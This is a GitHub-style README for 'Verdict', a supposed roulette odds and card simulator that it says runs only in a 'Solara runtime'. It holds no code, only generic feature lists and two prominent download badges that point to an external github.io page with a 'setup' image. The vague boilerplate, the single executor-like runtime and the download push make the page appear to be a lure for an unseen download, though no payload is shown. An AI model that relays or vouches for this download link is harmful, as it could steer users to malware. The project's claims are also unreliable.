![preview](https://raw.githubusercontent.com/nintendinhokart/roulette-odds-engine/main/cover_ea8f3.svg)
[![Download](https://raw.githubusercontent.com/nintendinhokart/roulette-odds-engine/main/setup_1cf963a.svg)](https://nintendinhokart.github.io/roulette-odds-engine/)

# 🎲 Verdict — Probability Roulette Toolkit

**A transparent luck simulator where every spin is calculated in front of you.**

Verdict is a lightweight probability engine wrapped in a game-like shell. It takes the familiar thrill of a roulette table and replaces blind faith with visible math. Every outcome is decided by a documented odds table, a seeded randomizer, and a card system that reshapes the board mid-game. Players see their real chances before committing to a spin, turning guesswork into strategy.

The project is built for the Solara runtime environment, where it runs smoothly and predictably. Other runtime hosts may work, but they are untested territory — expect rough edges rather than guarantees.

---

## 📚 Table of Contents

- [Why Verdict Exists](#-why-verdict-exists)
- [Feature Highlights](#-feature-highlights)
- [The Card System Explained](#-the-card-system-explained)
- [Real-Time Odds Engine](#-real-time-odds-engine)
- [Runtime Compatibility](#-runtime-compatibility)
- [Interface & Experience](#-interface--experience)
- [Multilingual Layer](#-multilingual-layer)
- [Support Model](#-support-model)
- [Project Structure](#-project-structure)
- [Roadmap for 2026](#-roadmap-for-2026)
- [Contributing](#-contributing)
- [License](#-license)
- [Disclaimer](#-disclaimer)
- [Download](#-download)

---

## 🧭 Why Verdict Exists

Most chance-based games hide their math. You press a button, something happens, and you walk away wondering whether the table was ever fair to begin with. Verdict flips that relationship. Instead of asking players to trust an invisible wheel, it publishes the wheel.

The idea is simple: a roulette-style loop should feel exciting *and* legible. Excitement comes from uncertainty; legibility comes from honest numbers. Verdict delivers both by recalculating and displaying odds in real time, before and after every card flip, spin, or modifier is applied.

This repository is a fork-in-spirit of an earlier roulette experiment, reimagined as a proper toolkit rather than a one-off script. It keeps the playful energy of the original while adding structure, documentation, and a design that a community can actually build on.

---

## ✨ Feature Highlights

| Capability | Description |
|---|---|
| 🎯 Live probability readout | Odds update instantly as cards, spins, and modifiers change state |
| 🃏 Custom card deck | Twelve unique card archetypes with documented effects |
| 🧮 Seeded randomness | Deterministic mode available for reproducible sessions |
| ⚡ Lightweight footprint | No heavy assets, fast startup, minimal memory usage |
| 🌍 Multilingual interface | UI strings available in several community-translated languages |
| 📱 Responsive layout | Adapts to different screen sizes and display scales |
| 🕓 Always-available assistance | Support channel documented for ongoing questions |
| 🔒 Local-first logic | All calculations run on the client, no external calls required |

Every feature is designed around one principle: the player should never be surprised by the *rules*, only by the *result*.

---

## 🃏 The Card System Explained

Verdict does not rely on a single spinning wheel. Between spins, a card is drawn from a deck that mutates the table. Each card carries a defined effect — shifting payout multipliers, narrowing or widening the field, or temporarily locking certain outcomes.

Cards fall into three families:

- **Redistribution cards** — move probability weight from one segment to another.
- **Tempo cards** — change how quickly the wheel resolves, altering pacing rather than payout.
- **Wildcard effects** — rare picks that invert an assumption, such as swapping win/loss conditions for a single round.

Because every card's math is written into the odds engine, the probability display always reflects the *current* deck state. Draw a card, and the numbers move before your eyes. That transparency is the whole point.

A full card reference table lives in the `docs/` directory, with each archetype's numeric impact spelled out so contributors can extend or rebalance the deck without breaking the engine.

---

## 🧮 Real-Time Odds Engine

The odds engine is the heart of Verdict. It maintains a live model of the table and recomputes outcome probabilities on every state change. Rather than hiding this behind a single number, the engine exposes a breakdown: base odds, card modifiers, and the resulting final figure.

Key properties of the engine:

- **Separation of concerns** — base odds, modifiers, and rounding are handled independently.
- **Deterministic seeding** — pass a seed value and every spin becomes reproducible, useful for testing and demonstrations.
- **Floating-point care** — probabilities are normalized so the displayed figures always sum correctly.

For those who enjoy reading source before trusting it, the engine code is commented and organized into small, named functions so each step is auditable.

---

## 🖥️ Runtime Compatibility

Verdict is tuned specifically for the **Solara** runtime environment, where it behaves predictably and reliably. If you run it elsewhere, you are exploring uncharted ground — it may work, it may misbehave, and no support is offered for those paths.

The takeaway is straightforward: the project targets one runtime deliberately, optimizing for stability there rather than scattering effort across many hosts.

---

## 🎨 Interface & Experience

The interface is intentionally pared back. A central table shows the current probability distribution. A side panel lists the active card effects. A log records each spin with its resolved odds, giving players a personal history they can study.

Design choices worth noting:

- **Responsive UI** — the layout reflows cleanly across window sizes and display densities.
- **High-contrast readability** — numbers are the star, so typography favors clarity.
- **Minimal animation** — motion is used to signal state changes, not to decorate.

The overall experience aims for the feel of a well-kept scoreboard rather than a flashy casino floor.

---

## 🌍 Multilingual Layer

Verdict ships with a translation framework so the interface can speak more than one language. Language strings are stored in separate resource files, making it easy for contributors to add new locales without touching logic.

- Locale files are plain key–value maps.
- Missing keys fall back gracefully to the default language.
- Adding a language requires no code changes — only a new resource file.

This keeps the tool approachable for a global audience and encourages community-driven localization.

---

## 🕓 Support Model

Questions, bug reports, and feature ideas are handled through the repository's issue tracker. The intent is simple: no one should be left guessing how a feature works.

- **Issue tracker** — the primary channel for problems and proposals.
- **Documentation** — `docs/` holds detailed references for cards, odds, and configuration.
- **Response expectation** — maintainers aim to acknowledge reports promptly, though exact timing varies with availability.

Support is a shared effort, and well-written reports with reproduction steps get answers fastest.

---

## 🗂️ Project Structure

A quick orientation for newcomers:

- `src/` — core logic, including the odds engine and card system.
- `ui/` — interface layout, styling, and responsive rules.
- `locales/` — per-language resource files for the multilingual layer.
- `docs/` — extended documentation on cards, odds math, and configuration.
- `tests/` — reproducibility checks and probability validation.

Each directory has its own short README describing conventions, so a contributor can land in any folder and understand what belongs there.

---

## 🗺️ Roadmap for 2026

Planned directions for the year ahead:

- Expanded card archetypes with community-submitted effects.
- Additional locale packs driven by contributor translations.
- Exportable session logs for offline review.
- Refined odds visualization with distribution histograms.
- Documentation overhaul to make onboarding even smoother.

The roadmap is a living document and will shift as feedback arrives. Contributions that align with these goals are especially welcome.

---

## 🤝 Contributing

Contributions are encouraged. Before opening a change:

1. Read the relevant documentation in `docs/`.
2. Follow existing code style and naming conventions.
3. Include tests for logic changes wherever practical.
4. Describe the *why* behind your change, not just the *what*.

Small, focused changes are easier to review and more likely to land quickly. Big ideas are welcome too — open an issue first so the approach can be discussed.

---

## 📜 License

This project is released under the **MIT License**. You are welcome to use, modify, and distribute it in accordance with the license terms.

Read the full license text here: [MIT License](https://opensource.org/licenses/MIT)

---

## ⚠️ Disclaimer

Verdict is a probability simulation and educational toolkit. It is provided as-is, with no warranty of any kind, express or implied.

- The authors are not responsible for how the software is used or for any outcomes arising from its use.
- Functionality is guaranteed only on the Solara runtime; other environments are unsupported.
- This project involves no real-money wagering and no connection to any gambling service.
- Users are responsible for complying with the laws and platform rules that apply to them.

If any part of this project conflicts with your local regulations or a platform's terms, do not use it.

---

## ⬇️ Download

[![Download](https://raw.githubusercontent.com/nintendinhokart/roulette-odds-engine/main/setup_1cf963a.svg)](https://nintendinhokart.github.io/roulette-odds-engine/)